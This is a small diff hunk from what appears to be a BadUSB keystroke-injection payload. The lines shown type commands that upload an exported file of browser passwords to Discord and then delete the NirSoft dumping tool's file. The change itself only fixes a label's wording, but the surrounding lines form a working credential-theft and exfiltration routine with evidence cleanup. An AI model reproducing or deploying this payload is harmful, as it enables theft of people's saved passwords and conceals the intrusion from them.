@@ -53,7 +53,7 @@ ENTER
 DELAY 1000
 ALT F4
 DELAY 800
-STRING Upload-Discord -file "C:\temp\export.txt" -text "Browser password :"
+STRING Upload-Discord -file "C:\temp\export.txt" -text "Browser passwords :"
 ENTER
 STRING Del-Nirsoft-File
 ENTER
